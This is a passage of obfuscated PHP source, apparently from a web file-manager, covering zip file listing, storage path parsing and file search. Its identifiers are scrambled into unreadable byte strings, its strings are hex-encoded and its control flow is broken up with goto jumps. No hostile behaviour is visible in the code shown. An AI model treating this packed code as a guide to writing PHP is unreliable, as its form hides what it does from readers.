(request_url_safe($e‹°´‰Ÿí)) { $fÎŸø„Ğ¤ = parse_url_query($e‹°´‰Ÿí); if (!isset($fÎŸø„Ğ¤[$A³”Áˆ÷è¥[76]])) { show_json($A³”Áˆ÷è¥[785], !1); } } $CìÛ‹‚Û™š = isset($fÎŸø„Ğ¤) ? $fÎŸø„Ğ¤[$A³”Áˆ÷è¥[76]] : $e‹°´‰Ÿí; goto BÂ½ƒ“ËÊí; d‹Óö¨ÀĞÜ: if ($Cäšæ¶ˆÇ“ == -1) { $e‚‡Û£½’ = IO_PATH_SYSTEM_TEMP . "\x7a\x69\160\126\x69\145\x77\x2f{$FÏÖš—÷è¨}\x2f{$FÑ£áŒÃß‘}\x2e\154\157\x67"; $b„‡‘âŸ†‰ = self::infoFull($e‚‡Û£½’); if ($b„‡‘âŸ†‰) { $e‚‡Û£½’ = $b„‡‘âŸ†‰[$A³”Áˆ÷è¥[76]]; $b‚­é™¨¦é = self::getContent($e‚‡Û£½’); if ($b‚­é™¨¦é) { $fôéñŸçÌ = json_decode($b‚­é™¨¦é, !0); if (count($fôéñŸçÌ) >= $e¼ù‘ì„ˆ’) { show_json(sprintf(LNG($A³”Áˆ÷è¥[786]), count($fôéñŸçÌ)), !1); } return $fôéñŸçÌ; } } else { $e‚‡Û£½’ = self::mkfile($e‚‡Û£½’); } } $A–°Ì‚ê = TEMP_FILES . $FÏÖš—÷è¨; if (!is_dir($A–°Ì‚ê)) { mk_dir($A–°Ì‚ê); } goto FÅ´ÛÖ‹œ; e„´ÓÃŠ¯à: } private function zipFileList($c ¬óº÷Œ, $B…šŠ‘ªÍã = false) { $A«‹Æğ‚É– =& $_SERVER[İåâé¾]; $Fñë¥‡ˆÑ‹ = array(); foreach ($c ¬óº÷Œ as $c‚™•¨çø¦) { $f÷Ğã´ßã¿ = $c‚™•¨çø¦[$A«‹Æğ‚É–[76]]; if ($B…šŠ‘ªÍã) { $f÷Ğã´ßã¿ = self::copy($c‚™•¨çø¦[$A«‹Æğ‚É–[76]], $B…šŠ‘ªÍã, $A«‹Æğ‚É–[512]); } if ($f÷Ğã´ßã¿ && self::local()->exist($f÷Ğã´ßã¿)) { $Fñë¥‡ˆÑ‹[$c‚™•¨çø¦[$A«‹Æğ‚É–[76]]] = $f÷Ğã´ßã¿; } } if (!empty($Fñë¥‡ˆÑ‹)) { return array_values($Fñë¥‡ˆÑ‹); } show_json(LNG($A«‹Æğ‚É–[789]), !1); } public static function tmpFileName($B­¶ššÃæ) { $f›—È³ä¶ø =& $_SERVER[İåâé¾]; $E¶ñâ—ÂØ = array($B­¶ššÃæ[$f›—È³ä¶ø[28]], $B­¶ššÃæ[$f›—È³ä¶ø[76]], $B­¶ššÃæ[$f›—È³ä¶ø[78]], $B­¶ššÃæ[$f›—È³ä¶ø[373]]); return md5(implode($f›—È³ä¶ø[71], $E¶ñâ—ÂØ)); } private function localFilePath($bƒŠÚÛ§¼ë, $có²ÕŒ£) { goto cçĞ”¿ô×Â; d·âÅ­‰©›: return $DÓ Šª©Ñ->path; goto bÈµÔÜ¥‹Â; DîŠœ£ªØë: $DÓ Šª©Ñ = self::init($bƒŠÚÛ§¼ë); $b‹¦³˜ÔÀ„ = $DÓ Šª©Ñ->getType(); $CÀùÅøè = strtoupper(substr(PHP_OS, 0, 3)) == $f¯¯è£ÃÏ[791]; goto C “‘¦ùÔ; cçĞ”¿ô×Â: $f¯¯è£ÃÏ =& $_SERVER[İåâé¾]; $cŠ–òºæç­ = KodIO::parse($bƒŠÚÛ§¼ë); if ($cŠ–òºæç­[$f¯¯è£ÃÏ[29]] == KodIO::KOD_SOURCE) { $AÍïöŠØÓ = Model($f¯¯è£ÃÏ[521])->fileInfoGet(KodIO::sourceID($bƒŠÚÛ§¼ë)); if (!$AÍïöŠØÓ[$f¯¯è£ÃÏ[76]]) { show_json($f¯¯è£ÃÏ[790], !1); } $bƒŠÚÛ§¼ë = $AÍïöŠØÓ[$f¯¯è£ÃÏ[76]]; } goto DîŠœ£ªØë; C “‘¦ùÔ: if ($b‹¦³˜ÔÀ„ != $f¯¯è£ÃÏ[100] || $có²ÕŒ£ == $f¯¯è£ÃÏ[792] && $CÀùÅøè) { return !1; } if (!$DÓ Šª©Ñ->exist($DÓ Šª©Ñ->path)) { show_json(LNG($f¯¯è£ÃÏ[99]), !1); } self::archiveExt($có²ÕŒ£); goto d·âÅ­‰©›; bÈµÔÜ¥‹Â: } private function archiveExt($dÚÂ ÕõÒŠ = '') { $GLOBALS[$_SERVER[İåâé¾][793]] = $dÚÂ ÕõÒŠ; } } class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\165\162\x63\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\163\145\162\122\x65\x63\171\x63\x6c\x65\175"; const KOD_USER_FAV = "\173\x75\163\x65\162\x46\141\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\x73\145\162\106\x69\x6c\x65\124\141\x67\175"; const KOD_USER_FILE_TYPE = "\173\165\163\145\162\x46\x69\154\145\124\171\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\173\x67\x72\x6f\x75\x70\122\157\x6f\x74\123\x65\154\146\x7d"; const KOD_USER_SHARE = "\173\x75\163\145\x72\123\x68\141\x72\x65\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\x61\162\x65\x54\157\115\x65\175"; const KOD_SHARE_ITEM = "\x7b\x73\x68\141\162\145\x49\x74\145\155\x7d"; const KOD_SHARE_LINK = "\x7b\163\150\x61\162\145\x49\164\x65\x6d\114\x69\x6e\x6b\x7d"; const KOD_SEARCH = "\x7b\163\145\x61\162\143\150\175"; const KOD_BLOCK = "\173\142\x6c\x6f\143\153\175"; const KOD_IO = "\x7b\x69\157\175"; const KOD_USER_RECENT = "\173\165\163\x65\x72\x52\x65\x6e\143\x65\x6e\x74\x7d"; const KOD_USER_DRIVER = "\173\x75\163\x65\x72\x44\162\x69\166\x65\x72\175"; public static function typeList() { $B»é ‘¸ =& $_SERVER[İåâé¾]; return array($B»é ‘¸[794] => self::KOD_SOURCE, $B»é ‘¸[795] => self::KOD_USER_RECYCLE, $B»é ‘¸[796] => self::KOD_USER_FAV, $B»é ‘¸[797] => self::KOD_USER_FILE_TAG, $B»é ‘¸[798] => self::KOD_USER_FILE_TYPE, $B»é ‘¸[799] => self::KOD_GROUP_ROOT_SELF, $B»é ‘¸[800] => self::KOD_USER_SHARE, $B»é ‘¸[801] => self::KOD_USER_SHARE_TO_ME, $B»é ‘¸[802] => self::KOD_SHARE_ITEM, $B»é ‘¸[803] => self::KOD_SHARE_LINK, $B»é ‘¸[804] => self::KOD_SEARCH, $B»é ‘¸[805] => self::KOD_BLOCK, $B»é ‘¸[806] => self::KOD_IO, $B»é ‘¸[807] => self::KOD_USER_RECENT, $B»é ‘¸[808] => self::KOD_USER_DRIVER); } public static function parse($d’ƒÚ´ó“Ù) { goto Eâé¨’ˆÊá; A”øíãÑ¶Ô: return $F¦¹Ê­ØÌ«; goto fÕöÉõ„Ûí; E¦„Ü³”ù: preg_match($d«Ğ¢ª–Å[809], $d’ƒÚ´ó“Ù, $F‚™ùİ‘İ); $F¦¹Ê­ØÌ« = array($d«Ğ¢ª–Å[810] => !1, $d«Ğ¢ª–Å[811] => !1, $d«Ğ¢ª–Å[812] => !1, $d«Ğ¢ª–Å[76] => $d’ƒÚ´ó“Ù, $d«Ğ¢ª–Å[757] => !1, $d«Ğ¢ª–Å[756] => $d«Ğ¢ª–Å[33]); if (is_array($F‚™ùİ‘İ) && count($F‚™ùİ‘İ) == 5) { $E®ÆŸÒôÑÒ = $d«Ğ¢ª–Å[813] . $F‚™ùİ‘İ[2] . $d«Ğ¢ª–Å[318]; if (in_array($E®ÆŸÒôÑÒ, $Bí›ğÅœ¡…)) { $F¦¹Ê­ØÌ«[$d«Ğ¢ª–Å[757]] = $F‚™ùİ‘İ[1]; $F¦¹Ê­ØÌ«[$d«Ğ¢ª–Å[29]] = $E®ÆŸÒôÑÒ; $F¦¹Ê­ØÌ«[$d«Ğ¢ª–Å[814]] = substr($E®ÆŸÒôÑÒ, 1, -1); $F¦¹Ê­ØÌ«[$d«Ğ¢ª–Å[368]] = $F‚™ùİ‘İ[3]; } $F¦¹Ê­ØÌ«[$d«Ğ¢ª–Å[756]] = $F‚™ùİ‘İ[4]; } goto A”øíãÑ¶Ô; Eâé¨’ˆÊá: $d«Ğ¢ª–Å =& $_SERVER[İåâé¾]; $d’ƒÚ´ó“Ù = self::clear($d’ƒÚ´ó“Ù); $Bí›ğÅœ¡… = array_values(self::typeList()); goto E¦„Ü³”ù; fÕöÉõ„Ûí: } public static function clear($a¨¶ÓæÕõ‚) { goto c¦‘„©Öæñ; c¦‘„©Öæñ: $AŠ¡ô“¶Ö =& $_SERVER[İåâé¾]; $a¨¶ÓæÕõ‚ = str_replace($AŠ¡ô“¶Ö[92], $AŠ¡ô“¶Ö[8], $a¨¶ÓæÕõ‚); $Dï®ˆ³í£Á = $AŠ¡ô“¶Ö[815]; goto AŠÆ¢Ã†ñ; c¸£ñî¶¶œ: if ($a¨¶ÓæÕõ‚ == $AŠ¡ô“¶Ö[8]) { return $AŠ¡ô“¶Ö[8]; } $a¨¶ÓæÕõ‚ = rtrim($a¨¶ÓæÕõ‚, $AŠ¡ô“¶Ö[8]); return $a¨¶ÓæÕõ‚; goto aÆÉíßÔª¾; AŠÆ¢Ã†ñ: if (substr($a¨¶ÓæÕõ‚, 0, 3) == $AŠ¡ô“¶Ö[816]) { $a¨¶ÓæÕõ‚ = substr($a¨¶ÓæÕõ‚, 3); } while (strstr($a¨¶ÓæÕõ‚, $Dï®ˆ³í£Á)) { $a¨¶ÓæÕõ‚ = str_replace($Dï®ˆ³í£Á, $AŠ¡ô“¶Ö[8], $a¨¶ÓæÕõ‚); } $a¨¶ÓæÕõ‚ = preg_replace($AŠ¡ô“¶Ö[817], $AŠ¡ô“¶Ö[8], $a¨¶ÓæÕõ‚); goto c¸£ñî¶¶œ; aÆÉíßÔª¾: } public static function sourceID($dÛÚ±„²Ó’) { $dªã–¥µŠ¡ =& $_SERVER[İåâé¾]; $F¶£õîâ‡õ = self::parse($dÛÚ±„²Ó’); if ($F¶£õîâ‡õ[$dªã–¥µŠ¡[29]] !== self::KOD_SOURCE) { show_json(LNG($dªã–¥µŠ¡[818]), !1); } return $F¶£õîâ‡õ[$dªã–¥µŠ¡[368]]; } public static function make($Fö›Ñ÷‚Ÿ ) { if (!$Fö›Ñ÷‚Ÿ ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Fö›Ñ÷‚Ÿ )); } public static function makeShare($d•¿¢™÷§¹, $a‡ã Ê¢ÎÛ) { return self::makePath(self::KOD_SHARE_ITEM, $d•¿¢™÷§¹, $a‡ã Ê¢ÎÛ); } public static function makeFileTypePath($C£ö‹• º¦) { return self::makePath(self::KOD_USER_FILE_TYPE, $C£ö‹• º¦); } public static function makeFileTagPath($Fª›” ”÷Ö) { return self::makePath(self::KOD_USER_FILE_TAG, $Fª›” ”÷Ö); } public static function makePath($Fâ£àÙÁÕš, $eîè˜¾ã = '', $a®è”Æ„‡¨ = '') { $FËõ„¹ìÂ =& $_SERVER[İåâé¾]; $CÙ¾Í½÷ª¢ = substr($Fâ£àÙÁÕš, 1, -1); $DõßÄõ²¡× = $FËõ„¹ìÂ[819] . $CÙ¾Í½÷ª¢ . $FËõ„¹ìÂ[492] . $eîè˜¾ã . $FËõ„¹ìÂ[820]; $DõßÄõ²¡× = $a®è”Æ„‡¨ ? $DõßÄõ²¡× . $a®è”Æ„‡¨ . $FËõ„¹ìÂ[8] : $DõßÄõ²¡×; return $DõßÄõ²¡×; } public static function initSystemPath() { $Dî£æ×ÃÕ… =& $_SERVER[İåâé¾]; $F¾‰…ë³†÷ = array($Dî£æ×ÃÕ…[821] => $Dî£æ×ÃÕ…[822], $Dî£æ×ÃÕ…[823] => $Dî£æ×ÃÕ…[824], $Dî£æ×ÃÕ…[825] => $Dî£æ×ÃÕ…[826], $Dî£æ×ÃÕ…[827] => $Dî£æ×ÃÕ…[828]); foreach ($F¾‰…ë³†÷ as $C–„ĞÌ£Ïš => $Bš…ÅÏææã) { if (!defined($C–„ĞÌ£Ïš)) { define($C–„ĞÌ£Ïš, self::systemPath($Bš…ÅÏææã)); } } } private static function systemPath($d˜§˜°…Ä©) { goto bŞó¬Ê¥; bÛ÷¾â»: return $aæ¬°èí»ƒ; goto Bš°«”—Ô; bŞó¬Ê¥: $fë”®‹Ã¯× =& $_SERVER[İåâé¾]; $BëŒ¾ß‡•“ = $fë”®‹Ã¯×[829] . ucfirst($d˜§˜°…Ä©); $aæ¬°èí»ƒ = Model($fë”®‹Ã¯×[830])->get($BëŒ¾ß‡•“); goto F›òæ†Üƒ³; F›òæ†Üƒ³: if ($aæ¬°èí»ƒ) { return $aæ¬°èí»ƒ; } if ($d˜§˜°…Ä© == $fë”®‹Ã¯×[822]) { $aæ¬°èí»ƒ = self::make(Model($fë”®‹Ã¯×[521])->systemRootPathAdd($fë”®‹Ã¯×[831])); } else { $aæ¬°èí»ƒ = self::systemPath($fë”®‹Ã¯×[822]); $a‘–…×Ï‚É = self::sourceID($aæ¬°èí»ƒ); $aæ¬°èí»ƒ = self::make(Model($fë”®‹Ã¯×[521])->mkdir($a‘–…×Ï‚É, $d˜§˜°…Ä©)); } Model($fë”®‹Ã¯×[830])->set($BëŒ¾ß‡•“, $aæ¬°èí»ƒ); goto bÛ÷¾â»; Bš°«”—Ô: } public static function systemFolder($B¼Ä²ßªö†) { $Aó¾ÁÙêİ = IO_PATH_SYSTEM_SOURCE . $B¼Ä²ßªö†; $b…°ÄÓğé = Cache::get($Aó¾ÁÙêİ); if (!$b…°ÄÓğé) { $e‹ÀÖÔß× = IO::infoFull($Aó¾ÁÙêİ); if (!$e‹ÀÖÔß×) { $b…°ÄÓğé = IO::mkdir($Aó¾ÁÙêİ, REPEAT_SKIP); } else { $b…°ÄÓğé = $e‹ÀÖÔß×[$_SERVER[İåâé¾][76]]; } Cache::set($Aó¾ÁÙêİ, $b…°ÄÓğé, 3600 * 10); } return $b…°ÄÓğé; } public static function defaultDriver() { return Model($_SERVER[İåâé¾][461])->defaultDriver(); } public static function defaultIO() { $C•İºç•Ñ =& $_SERVER[İåâé¾]; $d½¦†ß«á = self::defaultDriver(); return $C•İºç•Ñ[832] . $d½¦†ß«á[$C•İºç•Ñ[368]] . $C•İºç•Ñ[820]; } public static function fileTypeList() { $f¯¥†æ½ò· =& $_SERVER[İåâé¾]; $D§«…œõ…š = $GLOBALS[$f¯¥†æ½ò·[6]][$f¯¥†æ½ò·[833]]; foreach ($D§«…œõ…š as $D¼°„ºêæÖ => $F‘‚ÀŒšÇê) { $c™Ìù¢¹±Ğ = $f¯¥†æ½ò·[834] . $D¼°„ºêæÖ; $Dö½”Ç®ó = LNG($c™Ìù¢¹±Ğ); if ($c™Ìù¢¹±Ğ != $Dö½”Ç®ó) { $D§«…œõ…š[$D¼°„ºêæÖ][$f¯¥†æ½ò·[28]] = $Dö½”Ç®ó; } } return $D§«…œõ…š; } } goto EÜàõ»•‹°; dßõáÏ¾Ú: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($a´“ˆäÕºÙ) { goto F¸¥…¿º¢; e“÷àÓŠÁ: if (!$C·Àêèõ†Ê) { return array(); } $fÎ¬²ŞÓĞ‘ = $C·Àêèõ†Ê[$bó„±ñŸò‡[156]]; $EÓ­×‘Öã = $bó„±ñŸò‡[7]; goto bÃù®ïØ; bÃù®ïØ: if (!$C·Àêèõ†Ê[$bó„±ñŸò‡[156]]) { $bµÇ¨ÍÏ’± = array_to_keyvalue($eµ…ÂÂ›³Ü, $bó„±ñŸò‡[33], $bó„±ñŸò‡[156]); $fÎ¬²ŞÓĞ‘ = implode($bó„±ñŸò‡[47], $bµÇ¨ÍÏ’±); $EÓ­×‘Öã = $bó„±ñŸò‡[1705]; } $fË´æµª = explode($bó„±ñŸò‡[47], trim($fÎ¬²ŞÓĞ‘, $bó„±ñŸò‡[47])); return array($EÓ­×‘Öã, $fË´æµª); goto EêƒÖ¬¢; F¸¥…¿º¢: $bó„±ñŸò‡ =& $_SERVER[İåâé¾]; $eµ…ÂÂ›³Ü = KodIO::fileTypeList(); $C·Àêèõ†Ê = $eµ…ÂÂ›³Ü[$a´“ˆäÕºÙ]; goto e“÷àÓŠÁ; EêƒÖ¬¢: } public function listPathType($C·¡ÑÙŒªÁ) { $b‘‚¡À«¦İ =& $_SERVER[İåâé¾]; $B¹³òÃ’„ó = $this->fileTypeWhere($C·¡ÑÙŒªÁ); if (!$B¹³òÃ’„ó) { return array(); } $càß»Š”ƒ = array($b‘‚¡À«¦İ[392] => SourceModel::TYPE_USER, $b‘‚¡À«¦İ[394] => USER_ID, $b‘‚¡À«¦İ[386] => 0, $b‘‚¡À«¦İ[388] => $B¹³òÃ’„ó); return $this->listSource($càß»Š”ƒ); } public function listSearch($Eğê¦µÛ¨Š, $Fø¢İ‘ç = 300) { goto bÉŞ„©ÇˆŸ; f÷¦”Ëõ¶…: $this->_listFilterInfo($F‰‡Ûòùßö); return $F‰‡Ûòùßö; goto AÑˆ¬ˆÄœÕ; bÜŠàÑ‹ˆŒ: $this->_listSearchBindPinyin($Eğê¦µÛ¨Š, $D®’¡”Í½‡, $C‚öˆ‘‰ƒ„); $this->alias($cæÒ»Ä¸Š[1741])->_makeOrder()->cache(null, 10); $F‰‡Ûòùßö = $this->distinct(!0)->field($C‚öˆ‘‰ƒ„)->where($D®’¡”Í½‡)->selectPage($Fø¢İ‘ç); goto D›Í§õ¾š£; D›Í§õ¾š£: $this->_listSearchDesc($F‰‡Ûòùßö, $Eğê¦µÛ¨Š, $A¯ö±ø³çÍ); $this->_listSearchTag($F‰‡Ûòùßö, $Eğê¦µÛ¨Š, $A¯ö±ø³çÍ); $this->_listDataApply($F‰‡Ûòùßö[$cæÒ»Ä¸Š[356]]); goto f÷¦”Ëõ¶…; aó´£¾’¸Ô: if (!isset($D®’¡”Í½‡[$cæÒ»Ä¸Š[410]])) { $D®’¡”Í½‡[$cæÒ»Ä¸Š[410]] = 0; } $C‚öˆ‘‰ƒ„ = $cæÒ»Ä¸Š[1740]; $A¯ö±ø³çÍ = $C‚öˆ‘‰ƒ„; goto bÜŠàÑ‹ˆŒ; bÉŞ„©ÇˆŸ: $cæÒ»Ä¸Š =& $_SERVER[İåâé¾]; if (isset($Eğê¦µÛ¨Š[$cæÒ»Ä¸Š[1631]]) && $Eğê¦µÛ¨Š[$cæÒ»Ä¸Š[1631]]) { $Eğê¦µÛ¨Š[$cæÒ»Ä¸Š[1631]] = str_replace($cæÒ»Ä¸Š[1738], $cæÒ»Ä¸Š[1739], trim($Eğê¦µÛ¨Š[$cæÒ»Ä¸Š[1631]])); } $D®’¡”Í½‡ = $this->_parseSearchWhere($Eğê¦µÛ¨Š); goto aó´£¾’¸Ô; AÑˆ¬ˆÄœÕ: } private function _listSearchTag(&$Eø¨²¡¤à, $CåÑêÉ×Õï, $aöôœ‡‡) { goto CÅàÂâˆ¿; CÅàÂâˆ¿: $dâÊªëšÀ =& $_SERVER[İåâé¾]; if (!$CåÑêÉ×Õï[$dâÊªëšÀ[1631]] || $Eø¨²¡¤à[$dâÊªëšÀ[353]][$dâÊªëšÀ[342]] > 1) { return; } $EÜÚÑ‰ = Model($dâÊªëšÀ[1742])->listData(); goto fâÖ×¬‹¿; D‚ß¶ÌŠÚÖ: $BïØ¿Ò‘Ñœ = array_to_keyvalue($BïØ¿Ò‘Ñœ, $dâÊªëšÀ[33], $dâÊªëšÀ[76]); $fÜ‚¾âã¿  = array_unique($BïØ¿Ò‘Ñœ); $this->_listSearchMerge($Eø¨²¡¤à, $CåÑêÉ×Õï, $aöôœ‡‡, $fÜ‚¾âã¿ ); goto BÂ·õ¼ŸÍ; fâÖ×¬‹¿: $C¸Éóç‘óÏ = array(); $eñ’È‰Šöá = $CåÑêÉ×Õï[$dâÊªëšÀ[1631]]; foreach ($EÜÚÑ‰ as $f†À³¢Ï„¸) { $aœŒÖï²Õİ = $f†À³¢Ï„¸[$dâÊªëšÀ[28]]; $dƒ‚š…¡õ³ = str_replace($dâÊªëšÀ[50], $dâÊªëšÀ[33], Pinyin::encode($aœŒÖï²Õİ)); if (stripos($aœŒÖï²Õİ, $eñ’È‰Šöá) !== !1 || stripos($dƒ‚š…¡õ³, $eñ’È‰Šöá) !== !1) { $C¸Éóç‘óÏ[] = $f†À³¢Ï„¸[$dâÊªëšÀ[368]]; } } goto Bß‹Ëåœğ; Bß‹Ëåœğ: if (!$C¸Éóç‘óÏ) { return; } $C×¡¥ø„‡è = array($dâÊªëšÀ[1743] => array($dâÊªëšÀ[7], $C¸Éóç‘óÏ)); $BïØ¿Ò‘Ñœ = Model($dâÊªëšÀ[1744])->field($dâÊªëšÀ[76])->where($C×¡¥ø„‡è)->select(); goto D‚ß¶ÌŠÚÖ; BÂ·õ¼ŸÍ: } private function _listSearchDesc(&$EÆÃØ¼â…, $e«¶±Ï³Óé, $F¤¼Ç‹–’—) { goto dóÊÑ–¤Õ; a¼®‹¤Âª: $fÈ¥ˆÅ½œ = Model($C‘·ÜÜÑÓ[380])->field($C‘·ÜÜÑÓ[374])->where($AİÆ†ÍÚƒÏ)->select(); $eàõãœ¬…« = array_to_keyvalue($fÈ¥ˆÅ½œ, $C‘·ÜÜÑÓ[33], $C‘·ÜÜÑÓ[374]); $this->_listSearchMerge($EÆÃØ¼â…, $e«¶±Ï³Óé, $F¤¼Ç‹–’—, $eàõãœ¬…«); goto eÈ‚Şöíâ; dóÊÑ–¤Õ: $C‘·ÜÜÑÓ =& $_SERVER[İåâé¾]; if (!$e«¶±Ï³Óé[$C‘·ÜÜÑÓ[1631]] || $EÆÃØ¼â…[$C‘·ÜÜÑÓ[353]][$C‘·ÜÜÑÓ[342]] > 1) { return; } $aóŠÚ°ßÀ‡ = $this->listSearchChildren($e«¶±Ï³Óé[$C‘·ÜÜÑÓ[384]]); goto C³×ïè†¥ ; C³×ïè†¥ : $aóŠÚ°ßÀ‡ = array_unique($aóŠÚ°ßÀ‡); if (!$aóŠÚ°ßÀ‡) { return; } $AİÆ†ÍÚƒÏ = array($C‘·ÜÜÑÓ[374] => array($C‘·ÜÜÑÓ[7], $aóŠÚ°ßÀ‡), $C‘·ÜÜÑÓ[88] => $C‘·ÜÜÑÓ[1586], $C‘·ÜÜÑÓ[359] => array($C‘·ÜÜÑÓ[520], $C‘·ÜÜÑÓ[1633] . $e«¶±Ï³Óé[$C‘·ÜÜÑÓ[1631]] . $C‘·ÜÜÑÓ[1633])); goto a¼®‹¤Âª; eÈ‚Şöíâ: } private function _listSearchMerge(&$c¶ËÉÓ†, $EŠ­«®«‹Œ, $eÈØ–‡ëŞ‡, $B¹í›òÙø) { goto Bªİª‰»—í; AÃŸíœ›Õ: $f±ŠÇœŞ´ = array_diff($B¹í›òÙø, $f‡íğ¼¿¸¸); if (!$f±ŠÇœŞ´) { return; } $fóŒŸçî‚ƒ = array($f³¾ÁÍ·ÓŒ[374] => array($f³¾ÁÍ·ÓŒ[7], $f±ŠÇœŞ´)); goto føÄíï…Ç¡; føÄíï…Ç¡: $Aİ¼„´µ„õ = $this->field($eÈØ–‡ëŞ‡)->where($fóŒŸçî‚ƒ)->select(); if (!$Aİ¼„´µ„õ) { return; } $cùÊµĞî¬ = array(); goto bëÙëÜà°Ò; Bªİª‰»—í: $f³¾ÁÍ·ÓŒ =& $_SERVER[İåâé¾]; if (!$B¹í›òÙø) { return; } $f‡íğ¼¿¸¸ = array_to_keyvalue($c¶ËÉÓ†[$f³¾ÁÍ·ÓŒ[356]], $f³¾ÁÍ·ÓŒ[33], $f³¾ÁÍ·ÓŒ[374]); goto AÃŸíœ›Õ; bëÙëÜà°Ò: foreach ($Aİ¼„´µ„õ as $F¥‚°áÄ¸) { $EÆÃ¿Œ¹ = $f³¾ÁÍ·ÓŒ[47] . $EŠ­«®«‹Œ[$f³¾ÁÍ·ÓŒ[384]] . $f³¾ÁÍ·ÓŒ[47]; if (stripos($F¥‚°áÄ¸[$f³¾ÁÍ·ÓŒ[373]], $EÆÃ¿Œ¹) !== !1) { $cùÊµĞî¬[] = $F¥‚°áÄ¸; } } $c¶ËÉÓ†[$f³¾ÁÍ·ÓŒ[356]] = array_merge($cùÊµĞî¬, $c¶ËÉÓ†[$f³¾ÁÍ·ÓŒ[356]]); $c¶ËÉÓ†[$f³¾ÁÍ·ÓŒ[353]][$f³¾ÁÍ·ÓŒ[354]] += count($cùÊµĞî¬); goto eğÕ»†‹ï; eğÕ»†‹ï: } public function listSearchChildren($DèºÏ¢”©Å, $bÕ…øª”¿ = 5000) { goto B¶¥ª¡ìÄÀ; eá¯Í„ƒÇ: $E•¸‘Ô¯Ò˜ = array($C„†÷£Œ“˜[373] => array($C„†÷£Œ“˜[520], $d©Ëíµé£[$C„†÷£Œ“˜[373]] . $d©Ëíµé£[$C„†÷£Œ“˜[374]] . $C„†÷£Œ“˜[409])); $Bˆ¾ì¥ƒ‘¥ = $this->field($C„†÷£Œ“˜[374])->where($E•¸‘Ô¯Ò˜)->count(); if ($Bˆ¾ì¥ƒ‘¥ > $bÕ…øª”¿) { return $this->_listSearchChildrenNear($DèºÏ¢”©Å, $bÕ…øª”¿); } goto D®°ÀŞÅÒ¿; B¶¥ª¡ìÄÀ: $C„†÷£Œ“˜ =& $_SERVER[İåâé¾]; $Cğå˜’äÉÅ = array(); $d©Ëíµé£ = $this->sourceInfo($DèºÏ¢”©Å); goto eá¯Í„ƒÇ; D®°ÀŞÅÒ¿: $Eã²ëÌÀËª = $this->field($C„†÷£Œ“˜[374])->where($E•¸‘Ô¯Ò˜)->select(); $Cğå˜’äÉÅ = array_to_keyvalue($Eã²ëÌÀËª, $C„†÷£Œ“˜[33], $C„†÷£Œ“˜[374]); return $Cğå˜’äÉÅ; goto DŞèˆ¤’—‚; DŞèˆ¤’—‚: } private function _listSearchChildrenNear($fœÚê±——Ø, $eš‚²ØæÚî) { goto Aïğ Üğë›; dœ·ŒìÀ¤Ï: $d®·æÍ¡Øˆ = array_merge($d®·æÍ¡Øˆ, array_to_keyvalue($Dä›ŠøŞ¼æ, $F¢¦æ¥ÍÃ„[33], $F¢¦æ¥ÍÃ„[374])); $d®·æÍ¡Øˆ = array_slice($d®·æÍ¡Øˆ, 0, $eš‚²ØæÚî); return $d®·æÍ¡Øˆ; goto E‚Ñ®ï—†»; Cµ‹‡ã¿ğÀ: if (!$dà¨Î·µù˜) { return $d®·æÍ¡Øˆ; } $eŞ­Š‡¹°ï = array($F¢¦æ¥ÍÃ„[384] => array($F¢¦æ¥ÍÃ„[7], $dà¨Î·µù˜)); $Dä›ŠøŞ¼æ = $this->field($F¢¦æ¥ÍÃ„[1745])->where($eŞ­Š‡¹°ï)->select(); goto dœ·ŒìÀ¤Ï; cÔ×È¶Å¡: $Dä›ŠøŞ¼æ = $this->field($F¢¦æ¥ÍÃ„[1745])->where($eŞ­Š‡¹°ï)->select(); $dà¨Î·µù˜ = array_to_keyvalue(array_filter_by_field($Dä›ŠøŞ¼æ, $F¢¦æ¥ÍÃ„[375], $F¢¦æ¥ÍÃ„[376]), $F¢¦æ¥ÍÃ„[33], $F¢¦æ¥ÍÃ„[374]); $d®·æÍ¡Øˆ = array_merge($d®·æÍ¡Øˆ, array_to_keyvalue($Dä›ŠøŞ¼æ, $F¢¦æ¥ÍÃ„[33], $F¢¦æ¥ÍÃ„[374])); goto Cµ‹‡ã¿ğÀ; Aïğ Üğë›: $F¢¦æ¥ÍÃ„ =& $_SERVER[İåâé¾]; $d®·æÍ¡Øˆ = array(); $eŞ­Š‡¹°ï = array($F¢¦æ¥ÍÃ„[384] => $fœÚê±——Ø); goto cÔ×È¶Å¡; E‚Ñ®ï—†»: } private function _listSearchBindPinyin($D‘î¹÷î¸ˆ, &$f¢ç®˜Ñ, &$D­ŞäÏõÅ¤) { goto fªÓŠÒÉ‰…; fªÓŠÒÉ‰…: $eˆÌçğ†¸ =& $_SERVER[İåâé¾]; if (!Input::check($D‘î¹÷î¸ˆ[$eˆÌçğ†¸[1631]], $eˆÌçğ†¸[309]) || strlen($D‘î¹÷î¸ˆ[$eˆÌçğ†¸[1631]]) < 2) { return; } $a„õÊ»« = "\114\105\x46\x54\40\x4a\x4f\x49\116\40{$this->tablePrefix}\x69\x6f\137\163\x6f\x75\162\143\145\x5f\155\145\x74\x61\40\155\x65\x74\141\40\x6f\x6e\40\163\x6f\165\162\x63\145\56\163\x6f\165\162\x63\x65\111\x44\x20\x3d\x20\x6d\145\x74\141\56\163\x6f\165\x72\143\145\111\x44"; goto cø§±Œ´Ô¸; DÔì­áº”É: unset($f¢ç®˜Ñ[$eˆÌçğ†¸[28]]); foreach ($f¢ç®˜Ñ as $aƒ£ Ê  => $A…ÎÖ•¯¤Æ) { $F‚¸šŒãù[$eˆÌçğ†¸[1747] . $aƒ£ Ê ] = $A…ÎÖ•¯¤Æ; } $AÉ«öİì£« = array($eˆÌçğ†¸[408], $eˆÌçğ†¸[1633] . $D‘î¹÷î¸ˆ[$eˆÌçğ†¸[1631]] . $eˆÌçğ†¸[1633]); goto fó‹ìˆÎÔá; cø§±Œ´Ô¸: $F‚¸šŒãù = array(); $D­ŞäÏõÅ¤ = str_replace(array($eˆÌçğ†¸[223], $eˆÌçğ†¸[50], $eˆÌçğ†¸[1746]), $eˆÌçğ†¸[33], $D­ŞäÏõÅ¤); $D­ŞäÏõÅ¤ = $eˆÌçğ†¸[1747] . str_replace($eˆÌçğ†¸[47], $eˆÌçğ†¸[1748], $D­ŞäÏõÅ¤); goto DÔì­áº”É; 